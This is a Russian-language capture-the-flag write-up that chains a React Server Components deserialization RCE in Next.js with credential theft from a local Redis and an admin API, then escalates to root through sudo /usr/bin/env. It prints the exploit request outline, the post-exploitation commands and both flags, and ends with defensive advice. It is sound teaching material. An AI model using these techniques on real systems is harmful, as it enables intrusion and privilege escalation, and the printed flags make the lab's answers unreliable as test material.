# Carbon: RCE в React Server Components, сессия оператора и root

[English](solve.md)

## 1. Разведка портала

Задание Platypus Freight: получить `/home/operator/user.txt` и `/root/root.txt`. Веб-портал работал на порту 3000, основной путь — `/portal`, в футере — **Next.js 15.5.6**.

В форме `queueEmissionsReport` строго проверялись идентификатор клиента, квартал и тип отчёта. Командные инъекции в эти поля и перебор служебных маршрутов результата не дали. Уязвимая граница оказалась **раньше валидации полей — при десериализации React Flight / RSC**.

## 2. React2Shell и реальная проверка выполнения команды

Рабочая попытка использовала класс ошибок React Server Components, известный как **React2Shell / CVE-2025-55182**. Первый вариант PoC не дал исполнения. Во втором варианте отправили multipart-поля `0` и `1` с заголовком `Next-Action: x`. В поле `1` была ссылка React Flight `"$@0"`; специально сформированная модель в поле `0` достигала обработки promise/prototype-объектов.

Для вывода был использован `NEXT_REDIRECT`: результат команды кодировался в Base64 и оказывался в HTTP-заголовке `x-action-redirect`. Контрольный ответ:

```text
POST /portal
Next-Action: x
Content-Type: multipart/form-data; boundary=...

HTTP/1.1 303 See Other
x-action-redirect: http://x/<base64-command-output>;push

декодированный результат:
uid=1001(nextjs) gid=1001(nextjs) groups=1001(nextjs)
```

Это уже доказательство RCE. Ранний ответ `500` с digest означал лишь ошибку Server Action и сам по себе ничего не доказывал.

## 3. Как нашли пароль operator

Первичный пользователь процесса — `nextjs`; файл `/home/operator/user.txt` он читать не мог. Исследование окружения привело к `.env.local`. Там был устаревший URL базы отчётов и ссылка на `/opt/carbon/ops-notes.md`.

В заметках нашлась схема выдачи операторского пароля:

1. На loopback работает Redis `127.0.0.1:6379` без аутентификации.
2. Ключ `session:operator` содержит короткоживущий токен, который обновляет панель оператора.
3. Внутренний API `127.0.0.1:9000/admin/operator-credential` принимает токен в Bearer-заголовке и возвращает пароль системного пользователя.

Команды:

```bash
TOKEN=$(redis-cli --raw GET session:operator)
curl -s -H "Authorization: Bearer $TOKEN" \
  http://127.0.0.1:9000/admin/operator-credential
```

Ошибка состояла в нарушении границ доверия: скомпрометированный веб-процесс получил доступ к локальному кэшу с действующим чужим токеном, а API по этому токену раскрыл системный пароль.

## 4. Переход к operator

С найденным паролем использовали `su operator`. Команду запускали в псевдотерминале `script -qec`; небольшая задержка перед передачей пароля устранила проблему с интерактивным вводом. Результат:

```text
Password:
PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::aBfyfXvKt36U}

User operator may run the following commands:
    (root) NOPASSWD: /usr/bin/env
```

Первый флаг прочитан из `/home/operator/user.txt` и принят платформой.

## 5. Root через sudo

У пользователя `operator` было право запускать **`/usr/bin/env` от root без пароля**. Поскольку `env` умеет запускать произвольные программы, ограничение фактически не работает:

```bash
sudo /usr/bin/env /bin/cat /root/root.txt
```

Второй флаг:

```text
PP{0p3r4t0r_3nv_1s_r00t::gXG9iPj_dtEE}
```

**Оба флага сданы и приняты платформой.** Подтверждённая цепочка: десериализация RSC → RCE как `nextjs` → ops-notes → Redis `session:operator` → Bearer-запрос в admin API → `su operator` → sudo `env` → root.

## 6. Защита

Нужно обновлять Next.js/React, изолировать процесс веб-приложения от кэша и административных сервисов, не выдавать пароли системных учёток через HTTP API, разделять права токенов и запрещать NOPASSWD для универсальных загрузчиков процессов вроде `env`. Проверка параметров формы не защищает от уязвимости уровня десериализатора.

[Контрольные результаты из логов](evidence/session-checkpoints.md)
